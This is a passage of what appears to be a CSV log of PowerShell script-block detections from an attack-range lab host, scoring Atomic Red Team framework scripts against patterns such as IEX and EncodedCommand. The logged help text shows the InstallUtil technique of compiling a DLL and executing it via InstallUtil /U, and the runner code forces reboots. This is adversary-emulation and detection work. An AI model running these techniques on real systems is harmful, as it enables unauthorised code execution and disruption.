            $fp = Join-Path $scriptParentPath ""Invoke-Process.ps1""
            $fp2 = Join-Path $scriptParentPath ""Invoke-KillProcessTree.ps1""
            invoke-command -Session $session -FilePath $fp
            invoke-command -Session $session -FilePath $fp2
            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt"" }
        }
        else {
            if ($interactive) {
                # This use case is: Local execution of tests that contain interactive prompts
                #   In this situation, let the stdout/stderr flow to the console
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds
            }
            else {
                # Local execution that DO NOT contain interactive prompts
                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller
                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile ""art-out.txt"" -stderrFile ""art-err.txt""
            }
        }
    )
    $res
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'
Pattern 'InvokeCommand' matched: 'invoke-command'"
"12/16/2024 8:34:55 PM","35710712","4",", EncodedCommand","EncodedCommand [Score: 4]","19452","# The class definitions that these functions rely upon are located in Private\AtomicClassSchema.ps1

function New-AtomicTechnique {
    <#
.SYNOPSIS

Specifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.

.PARAMETER AttackTechnique

Specifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with ""T"" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN

.PARAMETER DisplayName

Specifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'

.PARAMETER AtomicTests

Specifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

# Note: the input arguments are identical for atomic test #1 and #2
$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
'@

$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2

# Everything is ready to convert to YAML now!
$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml

.OUTPUTS

AtomicTechnique

Outputs an object representing an atomic technique.

The output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.
#>

    [CmdletBinding()]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory)]
        [String[]]
        $AttackTechnique,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DisplayName,

        [Parameter(Mandatory)]
        [AtomicTest[]]
        [ValidateNotNull()]
        $AtomicTests
    )

    $AtomicTechniqueInstance = [AtomicTechnique]::new()

    foreach ($Technique in $AttackTechnique) {
        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.
        # This is not a requirement so just warn the user.
        if ($Technique -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
            Write-Warning ""The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique""
        }
    }

    $AtomicTechniqueInstance.attack_technique = $AttackTechnique
    $AtomicTechniqueInstance.display_name = $DisplayName
    $AtomicTechniqueInstance.atomic_tests = $AtomicTests

    return $AtomicTechniqueInstance
}

function New-AtomicTest {
    <#
.SYNOPSIS

Specifies an atomic test.

.PARAMETER Name

Specifies the name of the test that indicates how it tests the technique.

.PARAMETER Description

Specifies a long form description of the test. Markdown is supported.

.PARAMETER SupportedPlatforms

Specifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.

A single test can support multiple platforms.

.PARAMETER ExecutorType

Specifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.

- CommandPrompt: The Windows Command Prompt, aka cmd.exe
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.

- PowerShell: PowerShell
  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe

- Sh: Linux's bourne shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.

- Bash: Linux's bourne again shell
  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.

.PARAMETER ExecutorElevationRequired

Specifies that the test must run with elevated privileges.

.PARAMETER ExecutorSteps

Specifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.

.PARAMETER ExecutorCommand

Specifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.

The -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the ""PowerShell"" ExecutorType is specified.

.PARAMETER ExecutorCleanupCommand

Specifies the command to execute if there are any artifacts that need to be cleaned up.

.PARAMETER InputArguments

Specifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.

.PARAMETER DependencyExecutorType

Specifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.

In most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.

.PARAMETER Dependencies

Specifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.

.EXAMPLE

$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.dll'
$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\T1118\src\T1118.cs'

$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
'@

.OUTPUTS

AtomicTest

Outputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.

The output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.
#>

    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]
    [OutputType([AtomicTest])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String[]]
        [ValidateSet('Windows', 'macOS', 'Linux')]
        $SupportedPlatforms,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $ExecutorType,

        [Switch]
        $ExecutorElevationRequired,

        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorSteps,

        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]
        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCommand,

        [String]
        [ValidateNotNullOrEmpty()]
        $ExecutorCleanupCommand,

        [AtomicInputArgument[]]
        $InputArguments,

        [String]
        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]
        $DependencyExecutorType,

        [AtomicDependency[]]
        $Dependencies
    )

    $AtomicTestInstance = [AtomicTest]::new()

    $AtomicTestInstance.name = $Name
    $AtomicTestInstance.description = $Description
    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }

    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

    switch ($PSCmdlet.ParameterSetName) {
        'AutomatedExecutor' {
            $ExecutorInstance = [AtomicExecutorDefault]::new()
            $ExecutorInstance.command = $ExecutorCommand
            $StringsWithPotentialInputArgs.Add($ExecutorCommand)
        }

        'ManualExecutor' {
            $ExecutorInstance = [AtomicExecutorManual]::new()
            $ExecutorInstance.steps = $ExecutorSteps
            $StringsWithPotentialInputArgs.Add($ExecutorSteps)
        }
    }

    switch ($ExecutorType) {
        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }
        default { $ExecutorInstance.name = $ExecutorType.ToLower() }
    }

    if ($ExecutorCleanupCommand) {
        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand
        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)
    }

    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }

    if ($Dependencies) {
        foreach ($Dependency in $Dependencies) {
            $StringsWithPotentialInputArgs.Add($Dependency.description)
            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)
            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)
        }
    }

    if ($DependencyExecutorType) {
        switch ($DependencyExecutorType) {
            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }
            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }
        }
    }    $AtomicTestInstance.dependencies = $Dependencies

    [Hashtable] $InputArgHashtable = @{ }

    if ($InputArguments.Count) {
        # Determine if any of the input argument names repeat. They must be unique.
        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {
            Write-Error ""There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.""
            return
        }

        # Convert each input argument to a hashtable where the key is the Name property.

        foreach ($InputArg in $InputArguments) {
            # Create a copy of the passed input argument that doesn't include the ""Name"" property.
            # Passing in a shallow copy adversely affects YAML serialization for some reason.
            $NewInputArg = [AtomicInputArgument]::new()
            $NewInputArg.default = $InputArg.default
            $NewInputArg.description = $InputArg.description
            $NewInputArg.type = $InputArg.type

            $InputArgHashtable[$InputArg.Name] = $NewInputArg
        }

        $AtomicTestInstance.input_arguments = $InputArgHashtable
    }

    # Extract all specified input arguments from executor and any dependencies.
    $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
    ForEach-Object { $Regex.Matches($_) } |
    Select-Object -ExpandProperty Groups |
    Where-Object { $_.Name -eq 'ArgName' } |
    Select-Object -ExpandProperty Value |
    Sort-Object -Unique


    # Validate that all executor arguments are defined as input arguments
    if ($InputArgumentNamesFromExecutor.Count) {
        $InputArgumentNamesFromExecutor | ForEach-Object {
            if ($InputArgHashtable.Keys -notcontains $_) {
                Write-Error ""The following input argument was specified but is not defined: '$_'""
                return
            }
        }
    }

    # Validate that all defined input args are utilized at least once in the executor.
    if ($InputArgHashtable.Keys.Count) {
        $InputArgHashtable.Keys | ForEach-Object {
            if ($InputArgumentNamesFromExecutor -notcontains $_) {
                # Write a warning since this scenario is not considered a breaking change
                Write-Warning ""The following input argument is defined but not utilized: '$_'.""
            }
        }
    }

    $AtomicTestInstance.executor = $ExecutorInstance

    return $AtomicTestInstance
}

function New-AtomicTestDependency {
    <#
.SYNOPSIS

Specifies a new dependency that must be met prior to execution of an atomic test.

.PARAMETER Description

Specifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING

.PARAMETER PrereqCommand

Specifies commands to check if prerequisites for running this test are met.

For the ""command_prompt"" executor, if any command returns a non-zero exit code, the pre-requisites are not met.

For the ""powershell"" executor, all commands are run as a script block and the script block must return 0 for success.

.PARAMETER GetPrereqCommand

Specifies commands to meet this prerequisite or a message describing how to meet this prereq

More specifically, this command is designed to satisfy either of the following conditions:

1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.
2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.

.EXAMPLE

$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'

.OUTPUTS

AtomicDependency

Outputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.

Note: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to ""Select-Object description, prereq_command, get_prereq_command"".
#>

    [CmdletBinding()]
    [OutputType([AtomicDependency])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $PrereqCommand,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $GetPrereqCommand
    )

    $DependencyInstance = [AtomicDependency]::new()

    $DependencyInstance.description = $Description
    $DependencyInstance.prereq_command = $PrereqCommand
    $DependencyInstance.get_prereq_command = $GetPrereqCommand

    return $DependencyInstance
}

function New-AtomicTestInputArgument {
    <#
.SYNOPSIS

Specifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).

.PARAMETER Name

Specifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.

.PARAMETER Description

Specifies a human-readable description of the input argument.

.PARAMETER Type

Specifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.

.PARAMETER TypeOverride

Specifies an unsupported input argument data type. Specifying this parameter should not be common.

.PARAMETER Default

Specifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.

.EXAMPLE

$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\WinRAR\Rar.exe'

.OUTPUTS

AtomicInputArgument

Outputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.
#>

    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]
    [OutputType([AtomicInputArgument])]
    param (
        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Description,

        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]
        [String]
        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]
        $Type,

        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TypeOverride,

        [Parameter(Mandatory)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Default
    )

    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {
        Write-Error ""Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name""
        return
    }

    $AtomicInputArgInstance = [AtomicInputArgument]::new()

    $AtomicInputArgInstance.description = $Description
    $AtomicInputArgInstance.default = $Default

    if ($Type) {
        $AtomicInputArgInstance.type = $Type

        # Validate input argument types when it makes sense to do so.
        switch ($Type) {
            'Url' {
                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {
                    Write-Warning ""The specified Url is not properly formatted: $Type""
                }
            }

            'Integer' {
                if (-not [Int]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Int is not properly formatted: $Type""
                }
            }

            'Float' {
                if (-not [Double]::TryParse($Type, [Ref] $null)) {
                    Write-Warning ""The specified Float is not properly formatted: $Type""
                }
            }

            # The following supported data types do not make sense to validate:
            # 'Path' { }
            # 'String' { }
        }
    }
    else {
        $AtomicInputArgInstance.type = $TypeOverride
    }

    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument
    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml
    # won't convert note properties during serialization.
    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru

    return $InputArgument
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e #'"
"12/16/2024 8:34:57 PM","35711064","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","9912",". ""$PSScriptRoot\Invoke-RunnerScheduleMethods.ps1""

function Invoke-AtomicRunner {
    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false)]
        [switch]
        $CheckPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $GetPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $Cleanup,

        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false)]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false)]
        $ListOfAtomics,

        [Parameter(Mandatory = $false)]
        [switch]
        $anyOS = $false,

        [parameter(Mandatory = $false)]
        [ValidateRange(0, [int]::MaxValue)]
        [int] $PauseBetweenAtomics,

        [parameter(Mandatory = $false)]
        [switch] $scheduledTaskCleanup,

        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]
        $OtherArgs
    )
    Begin { }
    Process {

        function Get-GuidFromHostName( $basehostname ) {
            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + ""-""), """"

            if (!$guid) {
                LogRunnerMsg ""Hostname has not been updated or could not parse out the Guid: "" + $guid
                return
            }

            # Confirm hostname contains a guid
            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'

            if ($guid -match $guidRegex) { return $guid } else { return """" }
        }

        function Invoke-AtomicTestFromScheduleRow ($tr) {
            $theArgs = $tr.InputArgs
            if ($theArgs.GetType().Name -ne ""Hashtable"") {
                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs
            }
            $sc = $tr.AtomicsFolder
            #Run the Test based on if scheduleContext is 'private' or 'public'
            if (($sc -eq 'public') -or ($null -eq $sc)) {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            elseif ($sc -eq 'private') {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            if ($timeToPause -gt 0) {
                Write-Host ""Sleeping for $timeToPause seconds...""
                Start-Sleep $timeToPause
            }
            elseif ($timeToPause -eq 0) {
                Write-Host 'Press any key to continue...';
                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
            }
        }

        function Rename-ThisComputer ($tr, $basehostname) {
            $hash = $tr.auto_generated_guid

            $newHostName = ""$basehostname-$hash""
            $shouldRename = $true
            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }
            if ($artConfig.verbose) { LogRunnerMsg ""Setting hostname to $newHostName"" }

            If (Test-Path $artConfig.stopFile) {
                LogRunnerMsg ""exiting script because $($artConfig.stopFile) exists""
                exit
            }

            if ($IsLinux) {
                if ($shouldRename) { Invoke-Expression $(""hostnamectl set-hostname $newHostName"") }
                Invoke-Expression $(""shutdown -r now"")
            }
            if ($IsMacOS) {
                if ($shouldRename) {
                    Invoke-Expression $(""/usr/sbin/scutil --set HostName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set ComputerName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set LocalHostName $newHostName"")
                }
                Invoke-Expression $(""/sbin/shutdown -r now"")
            }
            else {
                if ($debug) { LogRunnerMsg ""Debug: pretending to rename the computer to $newHostName""; exit }
                if (-not $shouldRename) { Restart-Computer -Force }
                $retry = $true; $count = 0
                while ($retry) {
                    Rename-Computer -NewName $newHostName -Force -Restart
                    Start-Sleep 120; $count = $count + 1
                    LogRunnerMsg ""Retrying computer rename $count""
                    if ($count -gt 60) { $retry = $false }
                }

                Start-Sleep -seconds 30
                LogRunnerMsg ""uh oh, still haven't restarted - should never get to here""
                $retry = $true; $count = 0
                while ($retry) {
                    $count = $count + 1
                    LogRunnerMsg ""Rename retry $count""
                    Restart-Computer -Force
                    Start-Sleep 300;
                    if ($count -gt 60) { $retry = $false }
                }
                exit
            }

        }

        function Get-TimingVariable ($sched) {
            $atcount = $sched.Count
            if ($null -eq $atcount) { $atcount = 1 }
            $scheduleTimeSpanSeconds = $artConfig.scheduleTimeSpan.TotalSeconds
            $secondsForAllTestsToComplete = $scheduleTimeSpanSeconds
            $sleeptime = ($secondsForAllTestsToComplete / $atcount) - 120 - $artConfig.kickOffDelay.TotalSeconds # 1 minute for restart and 1 minute delay for scheduled task and an optional kickoff delay
            if ($sleeptime -lt 120) { $sleeptime = 120 } # minimum 2 minute sleep time
            return $sleeptime
        }

        # Convert OtherArgs to hashtable so we can pass it through to the call to Invoke-AtomicTest
        $htvars = @{}
        if ($OtherArgs) {
            $OtherArgs | ForEach-Object {
                if ($_ -match '^-') {
                    #New parameter
                    $lastvar = $_ -replace '^-'
                    $htvars[$lastvar] = $true
                }
                else {
                    #Value
                    $htvars[$lastvar] = $_
                }
            }
        }
        if ($PSBoundParameters.ContainsKey(""PauseBetweenAtomics"")) {
            $timeToPause = $PauseBetweenAtomics
        }
        else {
            $timeToPause = $null
        }
        $htvars += [Hashtable]$PSBoundParameters
        $htvars.Remove('listOfAtomics') | Out-Null
        $htvars.Remove('OtherArgs') | Out-Null
        $htvars.Remove('PauseBetweenAtomics') | Out-Null
        $htvars.Remove('scheduledTaskCleanup') | Out-Null

        $schedule = Get-Schedule $listOfAtomics $true $null (-not $anyOS)

        # If the schedule is empty, end process
        if (-not $schedule) {
            LogRunnerMsg ""No test guid's or enabled tests.""
            return
        }

        # timing variables
        $SleepTillCleanup = Get-TimingVariable $schedule

        # Perform cleanup, Showdetails or Prereq stuff for all scheduled items and then exit
        if ($Cleanup -or $ShowDetails -or $CheckPrereqs -or $ShowDetailsBrief -or $GetPrereqs -or $listOfAtomics) {
            $schedule | ForEach-Object {
                Invoke-AtomicTestFromScheduleRow $_
            }
            return
        }

        # exit if file stop.txt is found
        If (Test-Path $artConfig.stopFile) {
            LogRunnerMsg ""exiting script because $($artConfig.stopFile) does exist""
            Write-Host -ForegroundColor Yellow ""Exiting script because $($artConfig.stopFile) does exist.""; Start-Sleep 10;
            exit
        }

        # Find current test to run
        $guid = Get-GuidFromHostName $artConfig.basehostname
        if ([string]::IsNullOrWhiteSpace($guid)) {
            LogRunnerMsg ""Test Guid ($guid) was null, using next item in the schedule""
        }
        else {
            if ($artConfig.verbose) { LogRunnerMsg ""Found Test: $guid specified in hostname"" }
            $sp = [Collections.Generic.List[Object]]$schedule
            $currentIndex = $sp.FindIndex( { $args[0].auto_generated_guid -eq $guid })
            if (($null -ne $currentIndex) -and ($currentIndex -ne -1)) {
                $tr = $schedule[$currentIndex]
            }

            if ($null -ne $tr) {
                if ($scheduledTaskCleanup) {
                    # Cleanup after running test
                    Write-Host -Fore cyan ""Sleeping for $SleepTillCleanup seconds before cleaning up for $($tr.Technique) $($tr.auto_generated_guid) ""; Start-Sleep -Seconds $SleepTillCleanup
                    $htvars.Add(""Cleanup"", $true)
                    Invoke-AtomicTestFromScheduleRow $tr
                }
                else {
                    # run the atomic test and exit
                    Invoke-AtomicTestFromScheduleRow $tr
                    Start-Sleep 3; exit
                }
            }
            else {
                LogRunnerMsg ""Could not find Test: $guid in schedule. Please update schedule to run this test.""
            }
        }

        # Load next scheduled test before renaming computer
        $nextIndex += $currentIndex + 1
        if ($nextIndex -ge ($schedule.count)) {
            $tr = $schedule[0]
        }
        else {
            $tr = $schedule[$nextIndex]
        }

        if ($null -eq $tr) {
            LogRunnerMsg ""Could not determine the next row to execute from the schedule, Starting from 1st row"";
            $tr = $schedule[0]
        }

        #Rename Computer and Restart
        Rename-ThisComputer $tr $artConfig.basehostname

    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:54 PM","35710546","3",", IEX, Get","IEX [Score: 2]; Get [Score: 1]","9912",". ""$PSScriptRoot\Invoke-RunnerScheduleMethods.ps1""

function Invoke-AtomicRunner {
    [CmdletBinding(
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false)]
        [switch]
        $CheckPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $GetPrereqs,

        [Parameter(Mandatory = $false)]
        [switch]
        $Cleanup,

        [Parameter(Mandatory = $false)]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false)]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false)]
        $ListOfAtomics,

        [Parameter(Mandatory = $false)]
        [switch]
        $anyOS = $false,

        [parameter(Mandatory = $false)]
        [ValidateRange(0, [int]::MaxValue)]
        [int] $PauseBetweenAtomics,

        [parameter(Mandatory = $false)]
        [switch] $scheduledTaskCleanup,

        [Parameter(Mandatory = $false, ValueFromRemainingArguments = $true)]
        $OtherArgs
    )
    Begin { }
    Process {

        function Get-GuidFromHostName( $basehostname ) {
            $guid = [System.Net.Dns]::GetHostName() -replace $($basehostname + ""-""), """"

            if (!$guid) {
                LogRunnerMsg ""Hostname has not been updated or could not parse out the Guid: "" + $guid
                return
            }

            # Confirm hostname contains a guid
            [regex]$guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'

            if ($guid -match $guidRegex) { return $guid } else { return """" }
        }

        function Invoke-AtomicTestFromScheduleRow ($tr) {
            $theArgs = $tr.InputArgs
            if ($theArgs.GetType().Name -ne ""Hashtable"") {
                $tr.InputArgs = ConvertFrom-StringData -StringData $theArgs
            }
            $sc = $tr.AtomicsFolder
            #Run the Test based on if scheduleContext is 'private' or 'public'
            if (($sc -eq 'public') -or ($null -eq $sc)) {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPublicAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            elseif ($sc -eq 'private') {
                Invoke-AtomicTest $tr.Technique -TestGuids $tr.auto_generated_guid -InputArgs $tr.InputArgs -TimeoutSeconds $tr.TimeoutSeconds -ExecutionLogPath $artConfig.execLogPath -PathToAtomicsFolder $artConfig.PathToPrivateAtomicsFolder @htvars -supressPathToAtomicsFolder
            }
            if ($timeToPause -gt 0) {
                Write-Host ""Sleeping for $timeToPause seconds...""
                Start-Sleep $timeToPause
            }
            elseif ($timeToPause -eq 0) {
                Write-Host 'Press any key to continue...';
                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
            }
        }

        function Rename-ThisComputer ($tr, $basehostname) {
            $hash = $tr.auto_generated_guid

            $newHostName = ""$basehostname-$hash""
            $shouldRename = $true
            if ( $newHostName -eq [System.Net.Dns]::GetHostName()) { $shouldRename = $false }
            if ($artConfig.verbose) { LogRunnerMsg ""Setting hostname to $newHostName"" }

            If (Test-Path $artConfig.stopFile) {
                LogRunnerMsg ""exiting script because $($artConfig.stopFile) exists""
                exit
            }

            if ($IsLinux) {
                if ($shouldRename) { Invoke-Expression $(""hostnamectl set-hostname $newHostName"") }
                Invoke-Expression $(""shutdown -r now"")
            }
            if ($IsMacOS) {
                if ($shouldRename) {
                    Invoke-Expression $(""/usr/sbin/scutil --set HostName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set ComputerName $newHostName"")
                    Invoke-Expression $(""/usr/sbin/scutil --set LocalHostName $newHostName"")
                }
                Invoke-Expression $(""/sbin/shutdown -r now"")
            }
            else {
                if ($debug) { LogRunnerMsg ""Debug: pretending to rename the computer to $newHostName""; exit }
                if (-not $shouldRename) { Restart-Computer -Force }
